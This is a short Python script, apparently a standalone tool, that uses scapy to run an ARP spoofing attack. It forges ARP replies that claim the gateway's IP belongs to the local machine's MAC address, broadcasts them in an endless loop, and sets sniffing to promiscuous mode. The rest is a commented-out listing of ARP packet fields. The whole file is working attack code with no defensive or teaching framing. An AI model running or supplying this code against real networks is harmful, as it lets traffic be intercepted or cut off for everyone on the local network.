# coding=utf-8

from scapy.all import ARP
from scapy.all import *
import socket
import struct
from tools import *
import datetime


def arp_attack():
    arpFake = ARP()

    psrc = get_gate_way()
    pdst = get_broadcast()
    hwsrc = get_mac_address()

    arpFake.psrc = psrc
    arpFake.pdst = pdst
    arpFake.hwsrc = hwsrc
    arpFake.op = 2

    while 1:
        send(arpFake)
        print 'arp send'



conf.sniff_promisc = True

'''
[ XShortField("hwtype", 0x0001),
                    XShortEnumField("ptype",  0x0800, ETHER_TYPES),
                    ByteField("hwlen", 6),
                    ByteField("plen", 4),
                    ShortEnumField("op", 1, {"who-has":1, "is-at":2, "RARP-req":3, "RARP-rep":4, "Dyn-RARP-req":5, "Dyn-RAR-rep":6, "Dyn-RARP-err":7, "InARP-req":8, "InARP-rep":9}),
                    ARPSourceMACField("hwsrc"),
                    SourceIPField("psrc","pdst"),
                    MACField("hwdst", ETHER_ANY),
                    IPField("pdst", "0.0.0.0") ]
'''
if __name__ == '__main__':
    arp_attack()

